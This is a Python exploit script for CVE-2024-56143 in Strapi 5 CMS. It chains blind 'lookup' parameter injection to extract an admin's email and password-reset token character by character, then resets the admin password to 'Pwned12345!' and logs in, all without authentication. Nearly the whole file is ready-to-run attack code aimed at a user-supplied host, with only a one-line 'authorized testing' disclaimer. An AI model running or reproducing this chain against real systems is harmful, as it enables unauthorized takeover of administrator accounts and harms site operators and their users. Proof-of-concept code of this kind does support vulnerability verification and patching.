#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Strapi 5 IDOR — Full Account Takeover Chain
# CVE            : CVE-2024-56143
# Vendor         : Strapi Solutions SAS
# Product        : Strapi (headless CMS)
# Affected       : >= 5.0.0, < 5.5.2
# Type           : CWE-639 - Authorization Bypass Through User-Controlled Key
# CVSS           : 8.2 (High)
# Platform       : Any (Node.js)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-10-16
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Strapi 5 IDOR — Full Account Takeover via lookup Parameter Injection

Demonstrates the complete escalation chain: email extraction, password reset
trigger, reset token extraction, password reset, and admin login — all from
an unauthenticated position.

ATTACK CHAIN:
  1. Extract admin email via blind lookup injection
  2. Trigger password reset for the admin account
  3. Extract resetPasswordToken via blind lookup injection
  4. Reset admin password using the extracted token
  5. Verify admin login with new credentials

PREREQUISITES:
  - Strapi 5.x instance (>= 5.0.0, < 5.5.2)
  - At least one content type with public read access and published entries

REFERENCES:
  - CVE-2024-56143
  - https://github.com/strapi/strapi/security/advisories/GHSA-495j-h493-42q2
"""

import sys
import json
import string
import time
import urllib.request
import urllib.parse
import urllib.error


# Reset tokens are typically hex or alphanumeric
TOKEN_CHARSET = "0123456789abcdef"  # Reset tokens are usually hex
EXTENDED_TOKEN_CHARSET = (
    "0123456789"
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "-_"
)

EMAIL_CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "@._-+"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 1337
DEFAULT_CONTENT_TYPE = "articles"
TIMEOUT = 10
MAX_TOKEN_LENGTH = 128


def check_lookup(base_url, relation, field, operator, value):
    """Send a lookup-injection request. Returns True if condition matched."""
    param_key = f"lookup[{relation}][{field}][{operator}]"
    query_string = urllib.parse.urlencode({param_key: value})
    url = f"{base_url}?{query_string}"

    try:
        req = urllib.request.Request(url, method="GET")
        req.add_header("Accept", "application/json")
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = json.loads(resp.read().decode())
            data = body.get("data", [])
            return len(data) > 0
    except urllib.error.HTTPError:
        return False
    except (urllib.error.URLError, TimeoutError) as e:
        print(f"  [!] Connection error: {e}")
        return False


def post_json(url, data):
    """Send a JSON POST request. Handles empty response bodies (HTTP 204)."""
    body = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            resp_body = resp.read().decode()
            if not resp_body:
                return resp.status, {}
            return resp.status, json.loads(resp_body)
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode() if e.fp else ""
        try:
            return e.code, json.loads(resp_body) if resp_body else {"raw": ""}
        except json.JSONDecodeError:
            return e.code, {"raw": resp_body}
    except Exception as e:
        return 0, {"error": str(e)}


def extract_email(base_url, relation="createdBy"):
    """Extract admin email via blind enumeration."""
    print("[*] Step 1: Extracting admin email...")
    known = ""
    for position in range(80):
        found = False
        for char in EMAIL_CHARSET:
            test_value = known + char
            result = check_lookup(base_url, relation, "email", "$startsWith", test_value)
            if result:
                known = test_value
                print(f"  [+] Position {position + 1:2d}: '{char}' → {known}")
                found = True
                break
        if not found:
            break
    return known


def trigger_password_reset(admin_url, email):
    """
    Step 2: Trigger a password reset for the admin email.
    This creates a resetPasswordToken in the database that we can then extract.
    """
    print(f"\n[*] Step 2: Triggering password reset for '{email}'...")
    url = f"{admin_url}/forgot-password"
    status, response = post_json(url, {"email": email})

    if status == 200:
        print(f"[+] Password reset triggered successfully (HTTP {status})")
        print("    A resetPasswordToken has been generated in the database.")
        return True
    elif status == 204:
        print(f"[+] Password reset triggered (HTTP {status} No Content)")
        return True
    elif status == 400:
        # Strapi may return 400 if email sending fails, but token is still created
        print(f"[~] HTTP {status} — email sending may have failed, but token may exist.")
        print(f"    Response: {json.dumps(response, indent=2)[:200]}")
        return True  # Token might still have been created
    else:
        print(f"[-] Unexpected response: HTTP {status}")
        print(f"    Response: {json.dumps(response, indent=2)[:200]}")
        return False


def check_reset_token_exists(base_url):
    """Check if a resetPasswordToken exists (non-null) via $ne operator."""
    print("\n[*] Step 3: Checking if resetPasswordToken exists...")
    # $ne with empty string: true if field has a non-empty value
    exists = check_lookup(
        base_url, "createdBy", "resetPasswordToken", "$ne", ""
    )
    if exists:
        print("[+] resetPasswordToken exists and is non-empty!")
        return True
    else:
        print("[-] resetPasswordToken is null or empty.")
        # Also try with a null check using $startsWith with any character
        for prefix_char in "0123456789abcdef":
            if check_lookup(base_url, "createdBy", "resetPasswordToken",
                          "$startsWith", prefix_char):
                print(f"[+] Found! Token starts with '{prefix_char}'")
                return True
        print("[-] No resetPasswordToken found.")
        return False


def extract_reset_token(base_url, relation="createdBy"):
    """
    Step 4: Extract the resetPasswordToken character-by-character.
    Strapi's reset tokens are generated by crypto.randomBytes(20).toString('hex'),
    producing a 40-character hexadecimal string.
    """
    print(f"\n[*] Step 4: Extracting resetPasswordToken...")

    known = ""
    request_count = 0
    start_time = time.time()

    for position in range(MAX_TOKEN_LENGTH):
        found = False
        # Try hex charset first (most likely)
        for char in TOKEN_CHARSET:
            test_value = known + char
            request_count += 1
            result = check_lookup(
                base_url, relation, "resetPasswordToken", "$startsWith", test_value
            )
            if result:
                known = test_value
                elapsed = time.time() - start_time
                rate = request_count / elapsed if elapsed > 0 else 0
                print(f"  [+] Position {position + 1:2d}: '{char}' → {known}  "
                      f"({request_count} reqs, {rate:.1f} req/s)")
                found = True
                break

        if not found:
            # Try extended charset as fallback
            for char in EXTENDED_TOKEN_CHARSET:
                if char in TOKEN_CHARSET:
                    continue  # Already tried
                test_value = known + char
                request_count += 1
                result = check_lookup(
                    base_url, relation, "resetPasswordToken", "$startsWith", test_value
                )
                if result:
                    known = test_value
                    print(f"  [+] Position {position + 1:2d}: '{char}' → {known}")
                    found = True
                    break

        if not found:
            print(f"\n[*] No match at position {position + 1}. Extraction complete.")
            break

    elapsed = time.time() - start_time
    print(f"[*] Token extraction: {elapsed:.1f}s, {request_count} requests")
    return known


def reset_password(admin_url, token, new_password="Pwned12345!"):
    """
    Step 5: Use the extracted reset token to set a new admin password.
    This completes the account takeover.
    """
    print(f"\n[*] Step 5: Resetting admin password with extracted token...")
    url = f"{admin_url}/reset-password"
    status, response = post_json(url, {
        "resetPasswordToken": token,
        "password": new_password,
    })

    if status == 200:
        print(f"[+] PASSWORD RESET SUCCESSFUL!")
        print(f"    New admin password: {new_password}")
        if "token" in response or "jwt" in str(response).lower():
            print(f"    Admin JWT received — full account takeover achieved!")
        return True
    else:
        print(f"[-] Password reset failed: HTTP {status}")
        print(f"    Response: {json.dumps(response, indent=2)[:300]}")
        return False


def verify_admin_login(admin_url, email, password):
    """Verify the takeover by logging in with the new credentials."""
    print(f"\n[*] Step 6: Verifying admin login with new credentials...")
    url = f"{admin_url}/login"
    status, response = post_json(url, {"email": email, "password": password})

    if status == 200 and "data" in response:
        token = response.get("data", {}).get("token", "")
        print(f"[+] ADMIN LOGIN SUCCESSFUL!")
        if token:
            print(f"    JWT Token: {token[:50]}...")
        return True
    else:
        print(f"[-] Login failed: HTTP {status}")
        return False


def exploit(target_host, target_port, content_type):
    """
    Full account takeover chain:
    1. Extract admin email
    2. Trigger password reset
    3. Extract reset token via blind injection
    4. Reset password with token
    5. Verify admin access
    """
    base_url = f"http://{target_host}:{target_port}/api/{content_type}"
    admin_url = f"http://{target_host}:{target_port}/admin"

    print("=" * 70)
    print(f"  CVE-2024-56143: Strapi 5 IDOR — Full Account Takeover Chain")
    print(f"  Target: {base_url}")
    print("=" * 70)
    print()

    # Step 1: Extract email
    email = extract_email(base_url)
    if not email or "@" not in email:
        print("\n[!] Could not extract a valid email address. Exiting.")
        sys.exit(1)
    print(f"\n[+] Extracted admin email: {email}")

    # Step 2: Trigger password reset
    if not trigger_password_reset(admin_url, email):
        print("\n[!] Could not trigger password reset. Exiting.")
        sys.exit(1)

    # Give Strapi a moment to process the reset request
    time.sleep(1)

    # Step 3: Check if token exists
    token_exists = check_reset_token_exists(base_url)
    if not token_exists:
        print("\n[!] No reset token found. The forgot-password endpoint may not")
        print("    have generated a token (email sending disabled?).")
        print("    Attempting extraction anyway...")

    # Step 4: Extract reset token
    token = extract_reset_token(base_url)
    if not token:
        print("\n[!] Could not extract reset token.")
        print("    This may happen if:")
        print("    - Email sending is disabled (token not generated)")
        print("    - Token uses an unexpected format")
        print("    - The content was not created by the admin whose token was reset")
        print()
        print("    NOTE: Even without token extraction, the password hash")
        print("    extraction (poc.py) and email enumeration (poc_vector2.py)")
        print("    remain fully viable attack vectors.")
        sys.exit(1)

    print(f"\n[+] Extracted reset token: {token}")

    # Step 5: Reset password
    new_password = "Pwned12345!"
    takeover = reset_password(admin_url, token, new_password)

    # Step 6: Verify
    if takeover:
        verify_admin_login(admin_url, email, new_password)

    # Summary
    print()
    print("=" * 70)
    print("  RESULTS")
    print("=" * 70)
    print(f"  Vulnerability:      CVE-2024-56143 (Strapi IDOR via lookup)")
    print(f"  Attack Chain:       Email extraction → Reset trigger → Token extraction → Takeover")
    print(f"  Target:             {base_url}")
    print(f"  Admin Email:        {email}")
    print(f"  Reset Token:        {token}")
    print(f"  Account Takeover:   {'YES' if takeover else 'NO'}")
    if takeover:
        print(f"  New Password:       {new_password}")
    print("=" * 70)

    return token


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    content_type = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CONTENT_TYPE
    exploit(target, port, content_type)
